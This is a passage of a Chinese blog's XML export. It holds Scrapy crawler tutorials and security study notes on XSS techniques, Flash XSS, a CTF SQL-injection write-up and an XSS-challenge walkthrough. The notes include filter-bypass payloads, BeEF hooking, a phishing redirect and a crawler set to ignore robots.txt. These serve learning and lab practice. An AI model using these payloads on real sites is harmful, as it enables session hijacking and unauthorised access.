node in node_list: item = TencentItem() item[&apos;positionName&apos;] = node.xpath(&quot;./td[1]/a/text()&quot;).extract()[0].encode(&quot;utf-8&quot;) item[&apos;positionLink&apos;] = node.xpath(&quot;./td[1]/a/@href&quot;).extract()[0].encode(&quot;utf-8&quot;) if len(node.xpath(&quot;./td[2]/text()&quot;)): item[&apos;positionType&apos;] = node.xpath(&quot;./td[2]/text()&quot;).extract()[0].encode(&quot;utf-8&quot;) else: item[&apos;positionType&apos;] = &quot;&quot; item[&apos;peopleNumber&apos;] = node.xpath(&quot;./td[3]/text()&quot;).extract()[0].encode(&quot;utf-8&quot;) item[&apos;workLocation&apos;] = node.xpath(&quot;./td[4]/text()&quot;).extract()[0].encode(&quot;utf-8&quot;) item[&apos;publishTime&apos;] = node.xpath(&quot;./td[5]/text()&quot;).extract()[0].encode(&quot;utf-8&quot;) yield item #if self.offset &lt; 2270: #self.offset += 10 #url = self.baseURL + str(self.offset) #yield scrapy.Request(url, callback = self.parse) if len(response.xpath(&quot;//a[@class=&apos;noactive&apos; and @id=&apos;next&apos;]&quot;)) == 0: url = response.xpath(&quot;//a[@id=&apos;next&apos;]/@href&quot;).extract()[0] yield scrapy.Request(&quot;http://hr.tencent.com/&quot; + url, callback = self.parse) 然后修改设置文件：将 1ROBOTSTXT_OBEY = True 改为： 1ROBOTSTXT_OBEY = False 并且打开爬虫任务（即去掉注释）： 123ITEM_PIPELINES = &#123; &apos;Tencent.pipelines.TencentPipeline&apos;: 300,&#125; 最后编写管道文件，确定存储方式：12345678910111213# -*- coding: utf-8 -*-import jsonclass TencentPipeline(object): def __init__(self): self.f = open(&quot;tencent.json&quot;, &quot;w&quot;) def process_item(self, item, spider): content = json.dumps(dict(item), ensure_ascii = False) + &quot;,\n&quot; self.f.write(content) return item def close_spider(self, spider): self.f.close() 总结：现阶段学习的scrapy框架爬虫难点在于xpath过滤信息，在接下来的学习中要熟练掌握xpath和beautifulsoup]]></content>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫（二）scrapy初探]]></title>
    <url>%2F2017%2F09%2F27%2Fscrapy(1)%2F</url>
    <content type="text"><![CDATA[创建时出现了个问题：AttributeError: ‘module’ object has no attribute ‘OP_NO_TLSv1_1’执行命令：sudo pip install twisted==13.1.0问题解决。 创建项目：scrapy startproject mySpider(项目名称) 创建成功后能看到如下所示的结构：123456789├── mySpider #项目的Python模块，将会从这里引用代码│?? ├── __init__.py│?? ├── items.py│?? ├── middlewares.py│?? ├── pipelines.py│?? ├── settings.py│?? └── spiders #储存爬虫的目录│?? └── __init__.py└── scrapy.cfg #项目的配置文件 进入items.py编辑属性：12345#teacherclass ItcastItem(scrapy.Item): name = scrapy.Filed() level = scrapy.Filed() info = scrapy.Filed() Spider是用户自己编写的类，用来从一个域中抓取信息。他们定义了用于下载的URL列表，跟踪链接的方案，解析网页内容的方式，以此来提取items要建立一个Spider，你必须用scrapy.spider.BaseSpider创建一个子类，并确定三个强制的属性： name：爬虫的识别名称，必须是唯一的，在不同的爬虫里你必须定义不同的名字 start_urls:抓取的URL列表，爬虫从这里开始抓取数据，所以第一次下载的数据将会从这些urls开始。其他子URL将会从这些其实URL中集成性生成 parse()：解析的方式，调用的时候传入从每一个URL传回的response对象作为唯一参数，负责解析并匹配抓取的数据（解析为item），跟踪更多的URL 编写爬虫：下面我们来定义一只爬虫，命名为itcast_spider.py,保存在mySpider\spiders目录下12345678910111213# -*- coding:utf-8 -*-import scrapyclass ItcastSpider(scrapy.spiders.spider): name = &quot;itcast&quot; start_urls = [ &quot;http://www.itcast.cn/channel/teacher.shtml#ac&quot; ] def parse(self, response): file_name = &quot;teacher.html&quot; open(file_name, &quot;w&quot;).write(response.body) 运行：1scrapy crawl itcast 没有出现error就说明没问题 进入文件夹发现多了个teacher.html 打开就是爬取的网页内容 取：在scrapy里，使用一种叫做XPath selectors的机制，它基于XPath表达式 下面是一些XPath表达式的例子和他们的含义：1234/html/head/title：选择HTML文档&lt;head&gt;下面的&lt;title&gt;标签/html/head/title/text():选择前面提到的&lt;title&gt;元素下面的文本内容//td:选择所有&lt;td&gt;元素//div[@class=&quot;mine&quot;]:选择所有包含class=&quot;mine&quot;属性的div标签元素 selectors有四种基础的方法：1234xpath():返回一系列的selectors，每个select表示一个xpath参数表达式选择的节点css():返回一系列的selectors，每个select表示一个css参数表达式选择的节点extract():返回一个Unicode字符串，为选中的数据re()：返回一个Unicode字符串，为使用正则表达式抓取出来的内容 1234567891011121314151617181920212223 # -*-coding:utf-8 -*-import scrapyclass ItcastSpider(scrapy.spiders.Spider): name = &quot;itcast&quot; start_urls = [ &quot;http://www.itcast.cn/channel/teacher.shtml#ac&quot; ] def parse(self, response): #file_name = &quot;teacher.html&quot; #open(file_name, &quot;w&quot;).write(response.body) for site in response.xpath(&apos;//div[@class=&quot;li_txt&quot;]&apos;): teacher_name = site.xpath(&apos;h3/text()&apos;).extract() teacher_level = site.xpath(&apos;h4/text()&apos;).extract() teacher_info = site.xpath(&apos;p/text()&apos;).extract() print teacher_name[0] #打印第零个元素，就是避免打印出乱码 print teacher_level[0] print teacher_info[0] print &quot;=======================================&quot; 存储：作为一只爬虫，spiders希望能将其抓取的数据存放到item对象中，为了返回我们抓取的数据，spider的最终代码应该是这样: 我们之前在mySpider/items.py里定义了一个itcastItem类，这里引入进来:1from mySpider.items import ItcastItem 然后将我们得到的数据封装到一个ItcastItem对象中，最终返回一个ItcastItem对象列表给架构 之前在items.py里的name、level、info还没用上，实际上这是给scrapy架构提供的一种数据类型1234567891011121314151617181920212223242526272829303132333435363738394041# -*-coding:utf-8 -*-import scrapyfrom mySpider.items import ItcastItemclass ItcastSpider(scrapy.spiders.Spider): name = &quot;itcast&quot; start_urls = [ &quot;http://www.itcast.cn/channel/teacher.shtml#ac&quot; ] def parse(self, response): #全部老师的集和 items = [] #file_name = &quot;teacher.html&quot; #open(file_name, &quot;w&quot;).write(response.body) for site in response.xpath(&apos;//div[@class=&quot;li_txt&quot;]&apos;): #一个老师的数据 item = ItcastItem() teacher_name = site.xpath(&apos;h3/text()&apos;).extract() teacher_level = site.xpath(&apos;h4/text()&apos;).extract() teacher_info = site.xpath(&apos;p/text()&apos;).extract() print teacher_name[0] print teacher_level[0] print teacher_info[0] print &quot;=======================================&quot; item[&apos;name&apos;] = teacher_name[0] item[&apos;level&apos;] = teacher_level[0] item[&apos;info&apos;] = teacher_info[0] items.append(item) return items 最后我们就要将爬取的数据保存到本地中保存信息最简单的方法是通过Feed exports，主要有四种：JSON, JSON Lines， CSV, XML我们将结果用最常用的JSON导出，命令：1scrapy crawl itcast -o itcast_teachers.json -t json 最后在当前目录下就会生成一个itcast_teachers.json文件。这是一个标准的数据文件，可以用任意一个可以解析json的工具或者接口来读取里面的内容]]></content>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫（一）]]></title>
    <url>%2F2017%2F09%2F27%2Fspider(1)%2F</url>
    <content type="text"><![CDATA[最简单的爬虫1234import urllib2response = urllib2.urlopen(&quot;http://www.baidu.com&quot;)html = response.read()print html 就写好了一个最简单的爬虫程序 加上User_Agent头但是一般网站会拒绝来自代码的非法请求，所以可以加上一个user-agent头12345678import urllib2url = &quot;http://www.baidu.com&quot;user_agent = &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;&quot;headers = &#123;&apos;User-Agent&apos;:user_agent&#125;req = urllib2.Request(url, headers = headers)response = urllib2.urlopen(req)the_page = response.read()print the_page 贴吧爬取实战1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#-*- coding:utf-8 -*-import urllib2def load_page(url): &apos;&apos;&apos; 发送url请求，返回一个静态html页面 &apos;&apos;&apos; user_agent = &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;&quot; headers = &#123;&quot;User-Agent&quot;:user_agent&#125; req = urllib2.Request(url, headers = headers) response = urllib2.urlopen(req) html = response.read() return htmldef write_to_file(file_name, txt): &apos;&apos;&apos; 将txt文本 存入到file_name文件中 &apos;&apos;&apos; print &quot;正在存储文件&quot; + file_name # 1 打开文件 f = open(file_name, &apos;w&apos;) # 2 读写文件 f.write(txt) # 3 关闭文件 f.close()def tieba_spider(name, begin_page, end_page): &apos;&apos;&apos; 贴吧小爬虫实战 &apos;&apos;&apos; for i in range(begin_page, end_page+1): #因为range(1,5)只会打印出1,2,3,4 pn = 50 * (i - 1) #组成一个完整的URL url1 = &quot;https://tieba.baidu.com/f?kw=&quot; url2 = &quot;&amp;ie=utf-8&amp;pn=&quot; my_url = url1 + name + url2 + str(pn) #pn是数字，需要强制转换成字符型 html = load_page(my_url) file_name = str(i) + &quot;.html&quot; write_to_file(file_name, html)#mainif __name__ == &quot;__main__&quot;: name = raw_input(&quot;请输入贴吧名：&quot;) begin_page = int(raw_input(&quot;请输入起始页码：&quot;)) end_page = int(raw_input(&quot;请输入终止页码：&quot;)) tieba_spider(name, begin_page, end_page) 内涵段子爬取实战：url：http://www.neihan8.com/article/list_5_1.html 1.首先找到网页变化规律： 翻页是仅仅是list_5_1，list_5_2的变化 2.通过爬虫先爬取网页源代码：12345678910111213141516171819202122232425262728293031# -*- coding:utf-8 -*-import urllib2class Spider: &apos;&apos;&apos; 内涵段子的一个爬虫类 &apos;&apos;&apos; def load_page(self, page): &apos;&apos;&apos; 发送内涵段子url请求，得到html源码 &apos;&apos;&apos; url = &quot;http://www.neihan8.com/article/list_5_&quot; +str(page) + &quot;.html&quot; user_agent = &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;&quot; headers = &#123;&quot;User-Agent&quot;:user_agent&#125; req = urllib2.Request(url, headers = headers) response = urllib2.urlopen(req) html = response.read() new_html = html.decode(&quot;gbk&quot;).encode(&quot;utf-8&quot;) #不加这句可能会出现乱码 return new_html#mainif __name__ == &quot;__main__&quot;: #创建一个spider对象 mySpider = Spider() the_page = mySpider.load_page(1) print the_page 3.查看网页源代码发现：段子在1&lt;p&gt;&lt;/p&gt; 标签中间，并且前面有一个1&lt;div class=&quot;f18 md20&quot;&gt; 类标签 使用如下语句进行过滤筛选。1pattern = re.compile(r&apos;&lt;div.*?class=&quot;f18 mb20&quot;&gt;(.*?)&lt;/div&gt;&apos;, re.S) 加个r可防止被转义;.*?表示中间可以加任意多个空格都可以匹配;re.s表示匹配所有，如果不加就是匹配当&gt;前行 4.最终版：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# -*- coding:utf-8 -*-import urllib2import reclass Spider: &apos;&apos;&apos; 内涵段子的一个爬虫类 &apos;&apos;&apos; def __init__(self): self.enable = True #默认为真，死循环 self.page = 1 #默认爬去页面为第一页 def load_page(self, page): &apos;&apos;&apos; 发送内涵段子url请求，得到html源码 &apos;&apos;&apos; url = &quot;http://www.neihan8.com/article/list_5_&quot; +str(page) + &quot;.html&quot; user_agent = &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;&quot; headers = &#123;&quot;User-Agent&quot;:user_agent&#125; req = urllib2.Request(url, headers = headers) response = urllib2.urlopen(req) html = response.read() new_html = html.decode(&quot;gbk&quot;).encode(&quot;utf-8&quot;) #用正则表达式将new-html过滤，得到所有的段子 #所有的段子在&lt;div class=&quot;f18 mb20&quot;&gt;----&lt;/div&gt; pattern = re.compile(r&apos;&lt;div.*?class=&quot;f18 mb20&quot;&gt;(.*?)&lt;/div&gt;&apos;, re.S) #加个r可防止被转义;.*?表示中间可以加任意多个空格都可以匹配;re.s表示匹配所有，如果不加就是匹配当&gt;前行 item_list = pattern.findall(new_html) return item_list def deal_one_page(self, item_list, page): &apos;&apos;&apos; 处理一页的数据 &apos;&apos;&apos; print &quot;**********第 %d 页的段子***********&quot; %(page) print &quot;正在存储第 %d 页的段子....&quot; %(page) for item in item_list: print item.replace(&quot;&lt;p&gt;&quot;,&quot;&quot;).replace(&quot;&lt;/p&gt;&quot;,&quot;&quot;).replace(&quot;&lt;br /&gt;&quot;,&quot;&quot;) self.write_to_file(item) print &quot;第 %d 页的段子存储完毕....&quot; % (page) def write_to_file(self, txt): f = open(&apos;./myStort.txt&apos;, &apos;a&apos;) f.write(txt) f.write(&apos;-------------------------------------------&apos;) f.close() def do_work(self): &apos;&apos;&apos; 提供跟用户交互的过程 让爬虫去工作 &apos;&apos;&apos; while self.enable: print &quot;按回车继续&quot; print &quot;输入quit退出&quot; command = raw_input() if (command == &quot;quit&quot;): self.enable = False break; item_list = self.load_page(self.page) self.deal_one_page(item_list, self.page) self.page += 1#mainif __name__ == &quot;__main__&quot;: #创建一个spider对象 mySpider = Spider() mySpider.do_work()]]></content>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS杂七杂八]]></title>
    <url>%2F2017%2F09%2F26%2FXSS%E5%AE%9E%E6%88%98%E6%96%B9%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[图片伪装XSS代码：PNG图片头信息：‰PNG GIF图片头信息：GIF89a JPG图片头信息：&amp;yuml;&amp;Oslash;&amp;yuml;àJFIF BMP图片头信息：BMF&amp;Ouml; 加密：有的网站会对alert过滤，可以使用aval：1eval(alert(123)) （alert（123）可以进行各种加密） DataURLS协议：1Data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encodeddata&gt; Data:指url协议 Mime type：代表的数据类型 Charset：默认是base64编码，如果要用其他的就用charset指定的字符类型 Encode data：对应的编码信息例子： ie不支持 XSS钓鱼：1http://127.0.0.1/index.php?search=document.location.href=”http://www.diaoyu.com&amp;#8221; flash xss：一个geturl语句：1getURL (“javascript:alert(document.domain)”,”_self”,”GET”); 先上传一个flash文件然后打开文件复制链接接着在视频处插入这个链接然后就弹框了 Xsio图片覆盖漏洞：1234&lt;/table&gt;&lt;a href=”javascript:alert(123)”&gt;&lt;img src=”图片地址”style=”position:absolute;left:123px;top:123px;”&gt;&lt;/a&gt; 绕过magic_quotes_gpc=onmagic_quotes_gpc=on是PHP中的安全设置，开启后会把一些特殊字符进行转义，针对此类网站，我们可以通过JavaScript中的String.fromCharCode方法来绕过 beef使用：在kali命令行先进入beef目录：1cd /usr/share/beef-xss 然后运行beef:1./beef 访问生成的UI URL管理接口，默认用户名和密码都是beef将生成的Hook URL提交的存在xss漏洞的地方，注意是1http://Hook%20URLçåå®¹ 然后就能使用了 第三方劫持（外调J/C）“第三方劫持”就是把资源域的服务器的权限拿下，替换相关资源，采用‘迂回式’的渗透方式。PS：J/C指的是javascript、css，其实还包括flash、etc、html等等，只是这个不经常使用而已。从字面上大家也可以猜出来，这是种什么攻击手法。名字里的”外调”不是从目标网站上插入新的J/C。而是在目标网站上找到不是本站的J/C。然后渗透那个网站，重写J/C。来达到渗透目标网站。1234567for(var i=0,tags=document.querySelectorAll(‘iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]’),tag;tag=tags[i];i++)&#123;var a = document.createElement(‘a’);a.href = tag.src||tag.href||tag.data;if(a.hostname!=location.hostname)&#123;console.warn(location.hostname+’ 发现第三方资源[‘+tag.localName+’]:’+a.href);&#125;&#125; 把这段输入在F12“审查元素”里”控制台”里，回车就OK。 未完待续….]]></content>
      <tags>
        <tag>Owasp top 10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Flash Xss]]></title>
    <url>%2F2017%2F09%2F26%2FFlash_Xss%2F</url>
    <content type="text"><![CDATA[Flash中编程使用的是ActionScript脚本, Flash产生的xss问题主要有两种方式：加载第三方资源和与javascript通信引发XSS。 更多flash xss学习链接：1https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/ 1http://wps2015.org/drops/drops/%E5%B8%B8%E8%A7%81Flash%20XSS%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F.html 1https://wizardforcel.gitbooks.io/xss-naxienian/content/13.html 1http://www.freebuf.com/sectool/108568.html flash安全沙盒Flash 安全沙盒用于控制swf文件间跨域访问,如果两个域之间没有进行信任授权是无法进行数据交互的.尝试访问会产生安全错误。两个不同安全域下的swf文件，之间是不能互相交互数据的。如果想让两个处于不同安全域内的SWF文件进行数据交互通信，必须要经过授权来实现。经过数据通信授权后即可进行数据通信交互。 授权ActionScript中关于SWF文件跨域信任授权访问是通过Security.allowDomain()方法来实现的。1http://a.example.com/a.swf 代码:1234567891011var loader:Loader =new Loader();loader.contentLoaderInfo.addEventListener(Event.INIT,init);var url:String=”http://b.example.com/b.swf&amp;#8221;;loader.load(new URLRequest(url));function init(event:Event):void&#123; trace(loader.content);&#125; 1http://b.example.com/b.swf 代码:123Security.allowDomain(“a.example.com”);Security.allowDomain(“*”); 上面是两种不同的设置方式 1.只允许a.example.com访问b.example.com中的SWF文件 2.如果使用*号那么任何域中的SWF文件都能访问执行调用b.exaple.com中的SWF文件。 1.Crossdomian.xml Crossdomian.xml是控制Flash的跨域策略文件,放在网站根目录.作用和allowDomain类似，在Crossdomain.xml文件中可以设置一个或多个信任域名.下面是youku的Corssdomian.xml文件。 //允许ykimgcom域名的Flash访问 2.Flash getURL XSS 在Flash中Actionscript2 可以使用getURL来执行JavaScript 下面以一个实例来剖析下Flash XSS过程：使用“Adobe Flash”创建Flash文件,F9快捷键调出代码编辑器,Ctrl+回车运行swf文件。用创建完成的Falsh文件。先看下面本地的简单测试实例 FLASH代码:代码大致意思加载外部含有xss代码的XML123456789var Fei_xml:XML = new XML(); //创建xml对象Fei_xml.ignoreWhite = true; //Fei_xml.onLoad = function()&#123;getURL(Fei_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue)&#125; //获取值Fei_xml.load(_root.xss); //加载XML文档 XML代码：1javascript:alert(‘Flash Xss Test’) 访问:1http://127.0.0.1/yins/xss/9.swf?xss=falsh.xml xss 代码触发 小结：造成Flash XSS 的主要原因就是没对?XSS=flash.xml获取的内容进行过滤导致的.提供一个查找此类漏洞文件的google关键字1Goole hack: filetype:swf inurl:xml 3.Flash navigateToURL XSS 在Actionscript3中已经不在支持getURL,可以用navigateToURL来执行javascript 下面以一个实例来剖析下Flash navigateToURL XSS过程. FLASH代码:12345678910111213141516171819202122232425262728293031var url:String = stage.loaderInfo.parameters.url //获取url参数值var req:URLRequest = new URLRequest(“falsh.xml”);var ld:URLLoader = new URLLoader();ld.addEventListener(Event.COMPLETE ,ok);var url:String = stage.loaderInfo.parameters.url //获取url参数值var req:URLRequest = new URLRequest(“falsh.xml”);var ld:URLLoader = new URLLoader();ld.addEventListener(Event.COMPLETE ,ok);function ok(evtObj:Event):void &#123;if(ld.data)&#123;//navigateToURL(new URLRequest(“javascript:alert(“+url+”)”),’_self’)navigateToURL(new URLRequest(url),’_self’) //通过navigateToURL调用执行&#125; else &#123;&#125;&#125;ld.load(req) 代码大意使用stage.loaderInfo.parameters.url 获取外部参数值，使用navigateToURL执行参数值。 访问:1http://127.0.0.1/yins/xss/flash.swf?url=javascript:alert(%27navigateToURL%20Flash%20XSS%20TEST%27) XSS代码触发 Flash ExternalInterface.call XSSFlash中同样可以使用ExternalInterface.call执行javascript 代码，ExternalInterface.call可传递零个参数或传递多个参数我们只探讨如下两个。 ExternalInterface.call(“函数名”):ExternalInterface.call(“函数名”,”参数”)。先说参数1缺陷时利用，参数1 也就是函数名.在参数1可控的时候即可造成XSS。先看下面Flash代码 FLASH代码:代码大意接收url提交的Feigege参数,然后 ExternalInterface.call把Feigege参数值放到ExternalInterface.call执行。12345678910111213var xss:String = root.loaderInfo.parameters.Feigegeif(ExternalInterface.available)&#123; // 属性报告当前容器是否为支持 ExternalInterfaceExternalInterface.call(xss) //执行js代码&#125; else &#123;trace(100)&#125;stop() 访问:1http://127.0.0.1/yins/xss/flash.swf?Feigege=alert(‘Flash xss TEst’) XSS代码触发 下面说参数2可控时的利用方式 FLASH代码:代码大意接收url提交的xss参数,然后 ExternalInterface.call把xss参数值放到ExternalInterface.call第二个参数执行。12345678910111213var key:String = root.loaderInfo.parameters.xssif(ExternalInterface.available)&#123;ExternalInterface.call(“alert”,key)//执行js&#125; else &#123;trace(100)&#125;stop() 访问:1http://127.0.0.1/yins/xss/flash.swf?xss=%27xss%27 Flash HTMLText XSS在Flash里支持HTMLText属性，HTMLText的作用是显示html标签等。可以使用 img 或者a标签触发xss代码。先看用a标签的情况下。 FLASH代码代码大意 获取Feigege参数值，放到TextField里面显示。1234567891011var a:String = root.loaderInfo.parameters.Feigege //获取提交参数的值var info:TextField = new TextField(); //创建控件对象info.multiline=true;info.wordWrap=true;info.htmlText = a; //显示addChild(info); &gt; 访问:1http://127.0.0.1/yins/xss/text.swf?Feigege=%3Ca%20href=%27javascript:alert(%22xss%20test%22)%27%3EXSS%20click%3C/a%3E 点击输出的XSS CLICK 这种方法相对比较被动还需要点击触发。接着看下面的利用方式。使用标签加载一个远程含有js跨站代码的swf文件. 访问:1http://127.0.0.1/yins/xss/text.swf?Feigege=&lt;img%20src=%27http://127.0.0.1/yins/xss/1.swf%27&amp;gt; 加载1.swf执行跨站代码 SWF代码:1ExternalInterface.call(“alert(‘xss test’)”); flash XSF加载第三方文件函数flash air中读取本地文件的三种方法 什么是XSF?就是使用ActionScript加载第三方的Flash文件时，攻击者能控制这个第三方的Flash文件这样就有可能造成XSF攻击，以下函数如果使用不当就很容易产生XSF问题。1234567891011121314151617loadVariables()loadMovie()loadMovieNum()FScrollPane.loadScrollContent()LoadVars.sendXML.load(‘URL’)LoadVars.load(‘url’)Sound.loadSound(‘url’)NetStream.play(‘url’) 在ActionScript2中可以使用loadMovie函数来加载第三方文件,在ActionScript3中,已经去掉这个函数，改由loader来进行外部数据处理，在HTML中嵌入flash时候IE下和非IE下也有所不同，IE下使用embed 非IE下使用object看下面例子。 HTML代码1234567&lt;html&gt;data=”http://192.168.1.126/yins/xss/3.swf”&amp;gt;name=”Flashvars” value=”swf=http://up.51xxs.com/users/public/1456213213_546475.swf”&lt;/html&gt; 在html中嵌入flash 时比较重要的两个参数allowScriptAccess和allowNetworking作用非别如下 allowScriptAccess：控制html页面与Flash页面的通讯。 always：html和Flash页面的通讯不做任何的限制； samedomain：html和Flash同域的时候可以做通讯【这个值是默认值】； never：html和Flash禁止通讯。 allowNetworking：控制Flash与外部的网络通讯。 all：Flash所有的网络API通讯接口都可用； internal：navigateToURL，fscommand，ExternalInterface.call不可用； none：所有的网络API不可用。 SWF代码1234567891011var param:Object = root.loaderInfo.parameters;var swf:String = param[“swf”];var myLoader:Loader = new Loader();var url:URLRequest = new URLRequest(swf);myLoader.load(url);addChild(myLoader); 访问:1http://192.168.1.126/yins/xss/1.html 会加载1http://up.51xxs.com/users/public/1456213213_546475.swf 这个恶意swf文件导致XSF。 未初始化变量导致的XSS在php 中Globals 也就是全局变量在开启的时候，允许在POST个GET参数中改变php脚本中变量的值。在ActionScript2中也有类似的特性，任何未被初始化的变量都可以以POST或GET方式来改变变量的值，因此会导致一些安全问题.看下面测试 VER.SWF代码：1234567if(user)&#123;getURL(_root.Feigege);&#125; 访问:1http://192.168.1.126/yins/xss/ver.swf?user=true&amp;Feigege=javascript:alert(/xss%20test/); 由于user未进行初始化变量赋值，导致可以通过GET方式为user赋值绕过，然后使用getURL来执行javascript代码 ————-爬自安全脉搏]]></content>
      <tags>
        <tag>Owasp top 10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实验吧一次有趣的sql注入]]></title>
    <url>%2F2017%2F09%2F26%2Fshiyanbar_sql%2F</url>
    <content type="text"><![CDATA[首先我们需要了解题目中php的工作原理，首先审源码得到了source.txt得到了源码，然后我们看一下源码干了什么，主要就是一个登陆认证！123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST[‘uname’]) || !isset($_POST[‘pwd’])) &#123;echo ‘&lt;form action=”” method=”post”&gt;’.”&lt;br/&gt;”;echo ‘&lt;input name=”uname” type=”text”/&gt;’.”&lt;br/&gt;”;echo ‘&lt;input name=”pwd” type=”text”/&gt;’.”&lt;br/&gt;”;echo ‘&lt;input type=”submit” /&gt;’.”&lt;br/&gt;”;echo ‘&lt;/form&gt;’.”&lt;br/&gt;”;echo ‘&lt;!–source: source.txt–&gt;’.”&lt;br/&gt;”;die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;if (is_array($StrValue))&#123;$StrValue=implode($StrValue);&#125;if (preg_match(“/”.$ArrReq.”/is”,$StrValue)==1)&#123;print “姘村彲杞借垷锛屼害鍙禌鑹囷紒”;exit();&#125;&#125;$filter = “and|select|from|where|union|join|sleep|benchmark|,|\(|\)”;foreach($_POST as $key=&gt;$value)&#123;AttackFilter($key,$value,$filter);&#125;$con = mysql_connect(“XXXXXX”,”XXXXXX”,”XXXXXX”);if (!$con)&#123;die(‘Could not connect: ‘ . mysql_error());&#125;$db=”XXXXXX”;mysql_select_db($db, $con);$sql=”SELECT * FROM interest WHERE uname = ‘&#123;$_POST[‘uname’]&#125;&apos;”;$query = mysql_query($sql);if (mysql_num_rows($query) == 1) &#123;$key = mysql_fetch_array($query);if($key[‘pwd’] == $_POST[‘pwd’]) &#123;print “CTF&#123;XXXXXX&#125;”;&#125;else&#123;print “浜﹀彲璧涜墖锛?”;&#125;&#125;else&#123;print “涓€棰楄禌鑹囷紒”;&#125;mysql_close($con);?&gt; 可以看到主要是1$filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)”; 这句话过滤了很多关键词，加上function AttackFilter这个函数起到了过滤的作用，这里是巧妙地用了select过程中​​用group by with rollup这个统计的方法进行插入查询。我们用mysql做几个小实验就明白这个是怎么用的了！12345678910111213mysql&gt; create table test (-&gt; user varchar(100) not null,-&gt; pwd varchar(100) not null);mysql&gt;insert into test values(“admin”,”mypass”);mysql&gt; select * from test group by pwd with rollup;+——-+————+| user | pwd |+——-+————+| guest | alsomypass || admin | mypass || admin | NULL |+——-+————+3 rows in set 123456mysql&gt; select * from test group by pwd with rollup limit 1;+——-+————+| user | pwd |+——-+————+| guest | alsomypass |+——-+————+ 1234567mysql&gt; select * from test group by pwd with rollup limit 1 offset 0;+——-+————+| user | pwd |+——-+————+| guest | alsomypass |+——-+————+1 row in set 1234567mysql&gt; select * from test group by pwd with rollup limit 1 offset 1;+——-+——–+| user | pwd |+——-+——–+| admin | mypass |+——-+——–+1 row in set 1234567mysql&gt; select * from test group by pwd with rollup limit 1 offset 2;+——-+——+| user | pwd |+——-+——+| admin | NULL |+——-+——+1 row in set 哎，然后我们就看到关键了，这个查询的时候可以想办法让pwd变成空，而且user这一列用的却是也是存在的字段！这就很好用了！又有(mysql_num_rows($query) 1234```知道只要一列。然后我们构造payload ’or 1=1 group by pwd with rollup limit 1 offset XX#```然后一个试出来就行啦。涨姿势！ ------扒自大佬博客]]></content>
      <tags>
        <tag>Owasp top 10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[暴走XSS]]></title>
    <url>%2F2017%2F09%2F26%2FBaozou_XSS%2F</url>
    <content type="text"><![CDATA[此题目几乎包含了现阶段初期的绝大部分xss构造题型，但是离实战还有很长一段距离要走，还差得远呢。言归正传，开始xss吧。 第一关：1http://118.89.167.246:2503/xss-game/level1.php?name=test 页面没个输入框，查看源码直接构造URL：1http://118.89.167.246:2503/xss-game/level1.php?name=alert(123) 第一关肯定是EZ的。 第二关：先在框里输入1，再查看源码看看输出位置，于是构造：1&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt; 第三关：老规矩，先在框里输入1，看看源码输出位置，于是构造：1&apos;&gt;&lt;script&gt;alert(123)&lt;/script&gt; 你以为能弹框了？过滤了尖括号哈哈哈哈。想到构造事件可以不使用尖括号：1&apos; onmouseover=&apos;alert(123); 成功弹框，查看源码：1&lt;input name=keyword value=&apos;&apos; onmouseover=&apos;alert(123);&apos;&gt; 第四关：输入1查看源码，初步构造（初步构造是指：1&lt;script&gt;alert(123)&lt;/script&gt; ，下同）,没有弹框，查看源码发现尖括号被过滤了，用第三关的本法，构造：1&quot; onmouseover=&quot;alert(123); 成功弹框。 第五关：初步构造测试后发现关键字script被替换成了scri_pt，on被替换成了o_n，但是测试发现JavaScript和href没被替换，于是想到可以用链接事件来绕过：1&quot;&gt;&lt;a href=&quot;javascript:alert(123);&quot; &gt;xss &lt;/a&gt;&lt;&quot; 成功弹框，查看源码：1&lt;input name=keyword value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(123);&quot; &gt;xss &lt;/a&gt;&lt;&quot;&quot;&gt; 第六关：初步构造后发现关键字被替换成了关键_字，想到以前遇到过的大小写绕过，成功弹框。 第七关：初步构造发现关键字被整个替换了，立马想到双写绕过，成功弹框。 第八关：这道题是将框里输入的内容转化为一个超链接，一开始没思路，但是在csdn（）上看到一篇文章，题目类似，利用伪协议：1javascript:alert(123) 但是JavaScript关键字被加了_转义，并且双引号被过滤，于是想到可以加换行符或指标符绕过（Unicode编码）1javascri pt:alert(123) 成功绕过。 什么是伪协议？ 伪协议不同于因特网上所真实存在的协议，如：http://,https://,ftp://,而是为关联应用程序而使用的如tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是JavaScript:我们可以在浏览地址栏里输入&quot;javascript(&apos;JS&apos;!);&quot;，跳转后发现实际上是把JavaScript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。JavaScript:伪协议后面可以使用URL编码。如：&lt;a href=&quot;javascript:%61lert(1)&quot;&gt;click me&lt;/a&gt;可成功执行弹框。但是用img标签就不行：&lt;img src=1 onerror=&quot;javascript:%61lert(1)&quot;&gt;。因为href属性会跳转到其中的URL并且进行url解码，onerror属性只会执行js 